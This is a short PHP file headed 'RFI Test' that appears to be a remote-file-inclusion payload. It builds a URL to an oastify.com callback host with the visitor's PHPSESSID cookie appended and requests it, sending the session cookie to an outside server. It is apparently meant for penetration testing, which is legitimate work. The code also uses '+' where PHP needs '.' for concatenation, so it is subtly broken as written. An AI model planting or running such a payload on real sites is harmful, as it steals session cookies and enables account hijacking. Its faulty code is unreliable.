<?php
	echo "RFI Test";
	$url = "http://89fm4azpt1ttzqy9f0ked1bxdojf75vu.oastify.com/?cookie=" + $_COOKIE["PHPSESSID"];
	$response = http_get($url);
?>
